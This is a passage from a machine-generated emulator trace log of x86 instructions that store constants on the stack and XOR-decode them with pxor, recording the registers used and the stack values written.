-0xd4 and offset 0x8134 for stack size 0x10000 saving data to stack: 896093928 4 0x45dad7: mov dword ptr [esp + 0x130], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8130 for stack size 0x10000 saving data to stack: 914789047 4 0x45dae2: pxor xmm1, xmmword ptr [esp + 0x130], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xd4 and offset 0x8130 for stack size 0x10000 0x45daeb: push eax, regs_read: [30, 19], regs_write: [30] 0x45daec: movaps xmmword ptr [esp + 0x84], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xd8 and offset 0x8084 for stack size 0x10000 saving data to stack: 7107189 16 0x45db00: push ecx, regs_read: [30, 22], regs_write: [30] 0x45db01: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45db08: push dword ptr [esp + 0xd4], regs_read: [30], regs_write: [30] 0x45db16: push dword ptr [esp + 0xd4], regs_read: [30], regs_write: [30] 0x45db22: movaps xmm1, xmmword ptr [esp + 0x120], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xe4 and offset 0x8120 for stack size 0x10000 0x45db2e: mov dword ptr [esp + 0x70], 0x5ef2f3c7, regs_read: [30], regs_write: () adjusting stack for ESP -0xe4 and offset 0x8070 for stack size 0x10000 saving data to stack: 1592980423 4 0x45db36: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45db38: mov dword ptr [esp + 0x74], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xe4 and offset 0x8074 for stack size 0x10000 saving data to stack: 896093928 4 0x45db40: mov dword ptr [esp + 0x78], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0xe4 and offset 0x8078 for stack size 0x10000 saving data to stack: 929680980 4 0x45db48: mov dword ptr [esp + 0x7c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0xe4 and offset 0x807c for stack size 0x10000 saving data to stack: 1389027477 4 0x45db50: pxor xmm1, xmmword ptr [esp + 0x70], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xe4 and offset 0x8070 for stack size 0x10000 0x45db56: push eax, regs_read: [30, 19], regs_write: [30] 0x45db57: movaps xmmword ptr [esp + 0x74], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xe8 and offset 0x8074 for stack size 0x10000 saving data to stack: 107860815622464282998862742438970899759 16 0x45db6a: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45db6f: mov dword ptr [esp + 0x110], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xe8 and offset 0x8110 for stack size 0x10000 saving data to stack: 914789047 4 0x45db7a: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45db7f: mov dword ptr [esp + 0x114], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xe8 and offset 0x8114 for stack size 0x10000 saving data to stack: 896093928 4 0x45db86: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45db8b: mov dword ptr [esp + 0x118], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xe8 and offset 0x8118 for stack size 0x10000 saving data to stack: 929680980 4 0x45db92: mov dword ptr [esp + 0x11c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xe8 and offset 0x811c for stack size 0x10000 saving data to stack: 1389027477 4 0x45db99: movaps xmm1, xmmword ptr [esp + 0x110], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xe8 and offset 0x8110 for stack size 0x10000 0x45dba1: mov dword ptr [esp + 0x6c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xe8 and offset 0x806c for stack size 0x10000 saving data to stack: 1389027477 4 0x45dba9: mov dword ptr [esp + 0x68], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xe8 and offset 0x8068 for stack size 0x10000 saving data to stack: 929680980 4 0x45dbad: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45dbaf: mov dword ptr [esp + 0x60], 0x5ef2f3c7, regs_read: [30], regs_write: () adjusting stack for ESP -0xe8 and offset 0x8060 for stack size 0x10000 saving data to stack: 1592980423 4 0x45dbb7: mov dword ptr [esp + 0x64], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xe8 and offset 0x8064 for stack size 0x10000 saving data to stack: 896093928 4 0x45dbbb: pxor xmm1, xmmword ptr [esp + 0x60], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xe8 and offset 0x8060 for stack size 0x10000 0x45dbc1: push eax, regs_read: [30, 19], regs_write: [30] 0x45dbc2: movaps xmmword ptr [esp + 0x64], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xec and offset 0x8064 for stack size 0x10000 saving data to stack: 1752457584 16 0x45dbd3: push ecx, regs_read: [30, 22], regs_write: [30] 0x45dbd4: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45dbdb: push dword ptr [esp + 0xe4], regs_read: [30], regs_write: [30] 0x45dbe9: push dword ptr [esp + 0xe4], regs_read: [30], regs_write: [30] 0x45dc0b: mov dword ptr [esp + 0x50], 0x138ce192, regs_read: [30], regs_write: () adjusting stack for ESP -0xf8 and offset 0x8050 for stack size 0x10000 saving data to stack: 327999890 4 0x45dc23: push ecx, regs_read: [30, 22], regs_write: [30] 0x45dc2c: push eax, regs_read: [30, 19], regs_write: [30] 0x45dc2d: mov dword ptr [esp + 0x5c], 0x3563449b, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x805c for stack size 0x10000 saving data to stack: 895698075 4 0x45dc39: mov dword ptr [esp + 0x60], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x8060 for stack size 0x10000 saving data to stack: 929680980 4 0x45dc41: mov dword ptr [esp + 0x64], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x8064 for stack size 0x10000 saving data to stack: 1389027477 4 0x45dc49: movaps xmm1, xmmword ptr [esp + 0x108], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x100 and offset 0x8108 for stack size 0x10000 0x45dc51: pxor xmm1, xmmword ptr [esp + 0x58], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x100 and offset 0x8058 for stack size 0x10000 0x45dc57: push eax, regs_read: [30, 19], regs_write: [30] 0x45dc58: push edi, regs_read: [30, 23], regs_write: [30] 0x45dc59: movaps xmmword ptr [esp + 0x60], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x108 and offset 0x8060 for stack size 0x10000 saving data to stack: 110050094705291497370115757810475917714 16 0x45dc91: push eax, regs_read: [30, 19], regs_write: [30] 0x45dca6: push edi, regs_read: [30, 23], regs_write: [30] 0x45dcac: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45dcad: mov edi, dword ptr [esp + 0xc], regs_read: [30], regs_write: [23] adjusting stack for ESP -0x10c and offset 0x800c for stack size 0x10000 0x45dcb1: mov byte ptr [esp + 0xb], 1, regs_read: [30], regs_write: () adjusting stack for ESP -0x10c and offset 0x800b for stack size 0x10000 saving data to stack: 1 1 0x45dcbf: mov eax, dword ptr [esp + 0x28], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x10c and offset 0x8028 for stack size 0x10000 0x45dce9: push eax, regs_read: [30, 19], regs_write: [30] 0x45dd07: mov eax, dword ptr [esp + 0x24], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x110 and offset 0x8024 for stack size 0x10000 0x45dd25: push ecx, regs_read: [30, 22], regs_write: [30] 0x45dd32: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45dd4b: pop edi, regs_read: [30], regs_write: [30, 23] 0x45dd4e: pop esi, regs_read: [30], regs_write: [30, 29] 0x45dd4f: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x108 and offset 0x8000 for stack size 0x10000 0x45dd51: pop ebp, regs_read: [30], regs_write: [30, 20] 0x45dd53: push ebp, regs_read: [30, 20], regs_write: [30] 0x45dd54: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x800 and offset 0x8000 for stack size 0x10000 0x45dd5f: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45dd64: mov dword ptr [esp + 0x38], 0x59e9d1eb, regs_read: [30], regs_write: () adjusting stack for ESP 0x800 and offset 0x8038 for stack size 0x10000 saving data to stack: 1508495851 4 0x45dd6c: mov ecx, 0x52cae095, regs_read: (), regs_write: [22] 0x45dd71: mov dword ptr [esp + 0x40], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x800 and offset 0x8040 for stack size 0x10000 saving data to stack: 929680980 4 0x45dd75: mov dword ptr [esp + 0x30], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x800 and offset 0x8030 for stack size 0x10000 saving data to stack: 929680980 4 0x45dd79: mov edx, 0x4f05f0, regs_read: (), regs_write: [24] 0x45dd7e: mov dword ptr [esp + 0x34], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x800 and offset 0x8034 for stack size 0x10000 saving data to stack: 1389027477 4 0x45dd86: push esi, regs_read: [30, 29], regs_write: [30] 0x45dd87: mov dword ptr [esp + 0x48], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x7fc and offset 0x8048 for stack size 0x10000 saving data to stack: 1389027477 4 0x45dd92: mov dword ptr [esp + 0x40], 0x460c2783, regs_read: [30], regs_write: () adjusting stack for ESP 0x7fc and offset 0x8040 for stack size 0x10000 saving data to stack: 1175201667 4 0x45dd9a: mov dword ptr [esp + 0x2c], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x7fc and offset 0x802c for stack size 0x10000 saving data to stack: 914789047 4 0x45dda2: mov dword ptr [esp + 0x30], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x7fc and offset 0x8030 for stack size 0x10000 saving data to stack: 896093928 4 0x45ddaa: movaps xmm1, xmmword ptr [esp + 0x2c], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x7fc and offset 0x802c for stack size 0x10000 0x45ddaf: pxor xmm1, xmmword ptr [esp + 0x3c], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x7fc and offset 0x803c for stack size 0x10000 0x45ddb5: push edi, regs_read: [30, 23], regs_write: [30] 0x45ddb8: movaps xmmword ptr [esp + 0x40], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x7f8 and offset 0x8040 for stack size 0x10000 saving data to stack: 8315168197161468764 16 0x45ddbd: push eax, regs_read: [30, 19], regs_write: [30] 0x45ddbe: mov dword ptr [esp + 0x14], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x7f4 and offset 0x8014 for stack size 0x10000 saving data to stack: 1819044194 4 0x45ddd6: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45dddf: push edi, regs_read: [30, 23], regs_write: [30] 0x45dde0: push eax, regs_read: [30, 19], regs_write: [30] 0x45ddef: mov esi, 0x4f0730, regs_read: (), regs_write: [29] 0x45ddf4: mov byte ptr [esp + 0xf], 0, regs_read: [30], regs_write: () adjusting stack for ESP 0x7f0 and offset 0x800f for stack size 0x10000 saving data to stack: 0 1 0x45ddf9: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45de15: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45de1c: mov eax, dword ptr [esp + 0x68], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x7f0 and offset 0x8068 for stack size 0x10000 0x45de20: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x45de22: mov dword ptr [esp + 0x20], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7f0 and offset 0x8020 for stack size 0x10000 saving data to stack: 0 4 0x45de2e: mov dword ptr [esp + 0x5c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7f0 and offset 0x805c for stack size 0x10000 saving data to stack: 0 4 0x45de3e: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45de54: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45de56: push eax, regs_read: [30, 19], regs_write: [30] 0x45de63: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45de65: push eax, regs_read: [30, 19], regs_write: [30] 0x45de80: mov esi, eax, regs_read: [19], regs_write: [29] 0x45de8b: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45de92: mov eax, dword ptr [esp + 0x60], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x7e8 and offset 0x8060 for stack size 0x10000 0x45de96: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x45de98: mov dword ptr [esp + 0x1c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7e8 and offset 0x801c for stack size 0x10000 saving data to stack: 0 4 0x45dea7: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45debf: mov dword ptr [esp + 0x40], 0x368692e8, regs_read: [30], regs_write: () adjusting stack for ESP 0x7e8 and offset 0x8040 for stack size 0x10000 saving data to stack: 914789096 4 0x45dec7: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45decc: mov dword ptr [esp + 0x10], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x7e8 and offset 0x8010 for stack size 0x10000 saving data to stack: 1819044194 4 0x45ded0: mov ecx, 0x52cae095, regs_read: (), regs_write: [22] 0x45ded5: mov dword ptr [esp + 0x48], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7e8 and offset 0x8048 for stack size 0x10000 saving data to stack: 929680980 4 0x45ded9: mov edi, 0x35694ee8, regs_read: (), regs_write: [23] 0x45dede: mov dword ptr [esp + 0x4c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x7e8 and offset 0x804c for stack size 0x10000 saving data to stack: 1389027477 4 0x45dee2: mov dword ptr [esp + 0x44], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x7e8 and offset 0x8044 for stack size 0x10000 saving data to stack: 896093928 4 0x45dee6: movaps xmm1, xmmword ptr [esp + 0x40], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x7e8 and offset 0x8040 for stack size 0x10000 0x45deeb: mov dword ptr [esp + 0x3c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x7e8 and offset 0x803c for stack size 0x10000 saving data to stack: 1389027477 4 0x45def6: mov dword ptr [esp + 0x38], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7e8 and offset 0x8038 for stack size 0x10000 saving data to stack: 929680980 4 0x45defa: mov dword ptr [esp + 0x30], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x7e8 and offset 0x8030 for stack size 0x10000 saving data to stack: 914789047 4 0x45df02: mov dword ptr [esp + 0x34], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x7e8 and offset 0x8034 for stack size 0x10000 saving data to stack: 896093928 4 0x45df06: pxor xmm1, xmmword ptr [esp + 0x30], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x7e8 and offset 0x8030 for stack size 0x10000 0x45df0c: push edx, regs_read: [30, 24], regs_write: [30] 0x45df11: movaps xmmword ptr [esp + 0x44], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x8044 for stack size 0x10000 saving data to stack: 95 16 0x45df1b: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45df28: push 0x4dc52d, regs_read: [30], regs_write: [30] 0x45df2d: mov dword ptr [esp + 0x14], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x45df36: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45df3b: mov dword ptr [esp + 0xe0], 0x3686f0d6, regs_read: [30], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x80e0 for stack size 0x10000 saving data to stack: 914813142 4 0x45df46: mov ecx, 0x52cae095, regs_read: (), regs_write: [22] 0x45df4b: mov dword ptr [esp + 0xe4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x80e4 for stack size 0x10000 saving data to stack: 896093928 4 0x45df52: mov dword ptr [esp + 0xec], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x80ec for stack size 0x10000 saving data to stack: 1389027477 4 0x45df59: mov edi, eax, regs_read: [19], regs_write: [23] 0x45df5b: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45df60: mov dword ptr [esp + 0x354], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x8354 for stack size 0x10000 saving data to stack: 896093928 4 0x45df67: mov dword ptr [esp + 0xe8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x80e8 for stack size 0x10000 saving data to stack: 929680980 4 0x45df6e: mov dword ptr [esp + 0x358], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x8358 for stack size 0x10000 saving data to stack: 929680980 4 0x45df75: mov dword ptr [esp + 0x35c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x835c for stack size 0x10000 saving data to stack: 1389027477 4 0x45df7c: mov dword ptr [esp + 0x350], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x8350 for stack size 0x10000 saving data to stack: 914789047 4 0x45df87: movaps xmm1, xmmword ptr [esp + 0x350], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x7e4 and offset 0x8350 for stack size 0x10000 0x45df8f: pxor xmm1, xmmword ptr [esp + 0xe0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x7e4 and offset 0x80e0 for stack size 0x10000 0x45df98: movaps xmmword ptr [esp + 0xe0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x80e0 for stack size 0x10000 saving data to stack: 25185 16 0x45dfa0: mov dword ptr [esp + 0x1f4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x81f4 for stack size 0x10000 saving data to stack: 896093928 4 0x45dfa7: mov dword ptr [esp + 0x1f8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x81f8 for stack size 0x10000 saving data to stack: 929680980 4 0x45dfae: mov dword ptr [esp + 0x1fc], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x81fc for stack size 0x10000 saving data to stack: 1389027477 4 0x45dfb5: mov dword ptr [esp + 0xd4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x80d4 for stack size 0x10000 saving data to stack: 896093928 4 0x45dfbc: mov dword ptr [esp + 0xd8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x80d8 for stack size 0x10000 saving data to stack: 929680980 4 0x45dfc3: mov dword ptr [esp + 0xdc], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x80dc for stack size 0x10000 saving data to stack: 1389027477 4 0x45dfca: mov dword ptr [esp + 0x1f0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x81f0 for stack size 0x10000 saving data to stack: 914789047 4 0x45dfd5: movaps xmm1, xmmword ptr [esp + 0x1f0], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x7e4 and offset 0x81f0 for stack size 0x10000 0x45dfdd: mov dword ptr [esp + 0xd0], 0x42fee699, regs_read: [30], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x80d0 for stack size 0x10000 saving data to stack: 1124001433 4 0x45dfe8: pxor xmm1, xmmword ptr [esp + 0xd0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x7e4 and offset 0x80d0 for stack size 0x10000 0x45dff1: mov dword ptr [esp + 0x204], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x8204 for stack size 0x10000 saving data to stack: 896093928 4 0x45dff8: mov dword ptr [esp + 0x208], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x8208 for stack size 0x10000 saving data to stack: 929680980 4 0x45dfff: mov dword ptr [esp + 0x20c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x820c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e006: movaps xmmword ptr [esp + 0xd0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x80d0 for stack size 0x10000 saving data to stack: 1954051118 16 0x45e00e: mov dword ptr [esp + 0xc8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x80c8 for stack size 0x10000 saving data to stack: 929680980 4 0x45e01c: mov dword ptr [esp + 0xc4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x80c4 for stack size 0x10000 saving data to stack: 896093928 4 0x45e02a: mov dword ptr [esp + 0xcc], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x80cc for stack size 0x10000 saving data to stack: 1389027477 4 0x45e038: mov dword ptr [esp + 0x200], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x8200 for stack size 0x10000 saving data to stack: 914789047 4 0x45e043: movaps xmm1, xmmword ptr [esp + 0x200], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x7e4 and offset 0x8200 for stack size 0x10000 0x45e04b: mov dword ptr [esp + 0xc0], 0x368692eb, regs_read: [30], regs_write: () adjusting stack for ESP 0x7e4 and offset 0x80c0 for stack size 0x10000 saving data to stack: 914789099 4 0x45e056: pxor xmm1, xmmword ptr [esp + 0xc0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x7e4 and offset 0x80c0 for stack size 0x10000 0x45e05f: push eax, regs_read: [30, 19], regs_write: [30] 0x45e060: movaps xmmword ptr [esp + 0xc4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x7e0 and offset 0x80c4 for stack size 0x10000 saving data to stack: 92 16 0x45e06d: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45e06e: push dword ptr [esp + 0x5c], regs_read: [30], regs_write: [30] 0x45e072: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45e079: push eax, regs_read: [30, 19], regs_write: [30] 0x45e086: push edi, regs_read: [30, 23], regs_write: [30] 0x45e08e: push eax, regs_read: [30, 19], regs_write: [30] 0x45e08f: push dword ptr [esp + 0x2c], regs_read: [30], regs_write: [30] 0x45e0a6: push eax, regs_read: [30, 19], regs_write: [30] 0x45e0b3: push eax, regs_read: [30, 19], regs_write: [30] 0x45e0de: push ecx, regs_read: [30, 22], regs_write: [30] 0x45e0df: push eax, regs_read: [30, 19], regs_write: [30] 0x45e0e5: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45e0e6: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45e0e7: mov edi, eax, regs_read: [19], regs_write: [23] 0x45e0f0: mov dword ptr [esp + 0x24], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x7c8 and offset 0x8024 for stack size 0x10000 saving data to stack: 896093928 4 0x45e11d: mov eax, dword ptr [esp + 0x10], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x7c8 and offset 0x8010 for stack size 0x10000 0x45e12f: mov dword ptr [esp + 0x10], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7c8 and offset 0x8010 for stack size 0x10000 saving data to stack: 0 4 0x45e138: mov eax, dword ptr [esp + 0x10], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x7c8 and offset 0x8010 for stack size 0x10000 0x45e14a: mov dword ptr [esp + 0x10], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7c8 and offset 0x8010 for stack size 0x10000 saving data to stack: 0 4 0x45e162: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45e164: push eax, regs_read: [30, 19], regs_write: [30] 0x45e171: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45e173: push eax, regs_read: [30, 19], regs_write: [30] 0x45e180: push eax, regs_read: [30, 19], regs_write: [30] 0x45e195: mov edx, 0x368692b7, regs_read: (), regs_write: [24] 0x45e19a: mov ecx, 0x35694ee8, regs_read: (), regs_write: [22] 0x45e19f: mov edi, 0x3769ce54, regs_read: (), regs_write: [23] 0x45e1a4: mov dword ptr [esp + 0x210], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x7bc and offset 0x8210 for stack size 0x10000 saving data to stack: 914789047 4 0x45e1ab: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45e1b0: mov dword ptr [esp + 0x214], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x7bc and offset 0x8214 for stack size 0x10000 saving data to stack: 896093928 4 0x45e1b7: mov dword ptr [esp + 0x218], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x7bc and offset 0x8218 for stack size 0x10000 saving data to stack: 929680980 4 0x45e1be: mov dword ptr [esp + 0x21c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7bc and offset 0x821c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e1c5: mov dword ptr [esp + 0x230], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x7bc and offset 0x8230 for stack size 0x10000 saving data to stack: 914789047 4 0x45e1cc: mov dword ptr [esp + 0x234], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x7bc and offset 0x8234 for stack size 0x10000 saving data to stack: 896093928 4 0x45e1d3: mov dword ptr [esp + 0x238], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x7bc and offset 0x8238 for stack size 0x10000 saving data to stack: 929680980 4 0x45e1da: mov dword ptr [esp + 0x23c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7bc and offset 0x823c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e1e1: mov dword ptr [esp + 0x250], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x7bc and offset 0x8250 for stack size 0x10000 saving data to stack: 914789047 4 0x45e1e8: mov dword ptr [esp + 0x254], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x7bc and offset 0x8254 for stack size 0x10000 saving data to stack: 896093928 4 0x45e1ef: mov dword ptr [esp + 0x258], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x7bc and offset 0x8258 for stack size 0x10000 saving data to stack: 929680980 4 0x45e1f6: mov dword ptr [esp + 0x25c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7bc and offset 0x825c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e1fd: mov dword ptr [esp + 0x270], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x7bc and offset 0x8270 for stack size 0x10000 saving data to stack: 914789047 4 0x45e204: mov dword ptr [esp + 0x274], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x7bc and offset 0x8274 for stack size 0x10000 saving data to stack: 896093928 4 0x45e20b: mov dword ptr [esp + 0x278], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x7bc and offset 0x8278 for stack size 0x10000 saving data to stack: 929680980 4 0x45e212: mov dword ptr [esp + 0x27c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7bc and offset 0x827c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e219: mov dword ptr [esp + 0x290], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x7bc and offset 0x8290 for stack size 0x10000 saving data to stack: 914789047 4 0x45e220: mov dword ptr [esp + 0x294], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x7bc and offset 0x8294 for stack size 0x10000 saving data to stack: 896093928 4 0x45e227: mov dword ptr [esp + 0x298], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x7bc and offset 0x8298 for stack size 0x10000 saving data to stack: 929680980 4 0x45e22e: mov dword ptr [esp + 0x29c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7bc and offset 0x829c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e235: mov dword ptr [esp + 0x2b0], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x7bc and offset 0x82b0 for stack size 0x10000 saving data to stack: 914789047 4 0x45e23c: mov dword ptr [esp + 0x2b4], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x7bc and offset 0x82b4 for stack size 0x10000 saving data to stack: 896093928 4 0x45e243: mov dword ptr [esp + 0x2b8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x7bc and offset 0x82b8 for stack size 0x10000 saving data to stack: 929680980 4 0x45e24a: mov dword ptr [esp + 0x2bc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7bc and offset 0x82bc for stack size 0x10000 saving data to stack: 1389027477 4 0x45e253: mov edi, 0x3769ce54, regs_read: (), regs_write: [23] 0x45e264: push 0x4dc52e, regs_read: [30], regs_write: [30] 0x45e270: mov esi, eax, regs_read: [19], regs_write: [29] 0x45e277: push 0x4dc52f, regs_read: [30], regs_write: [30] 0x45e288: push 0x4dc559, regs_read: [30], regs_write: [30] 0x45e299: push 0x4dc55a, regs_read: [30], regs_write: [30] 0x45e2aa: movaps xmm1, xmmword ptr [esp + 0x210], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x7ac and offset 0x8210 for stack size 0x10000 0x45e2b9: mov dword ptr [esp + 0xf0], 0x57ebfdd3, regs_read: [30], regs_write: () adjusting stack for ESP 0x7ac and offset 0x80f0 for stack size 0x10000 saving data to stack: 1475083731 4 0x45e2c7: mov dword ptr [esp + 0xf4], 0x35692081, regs_read: [30], regs_write: () adjusting stack for ESP 0x7ac 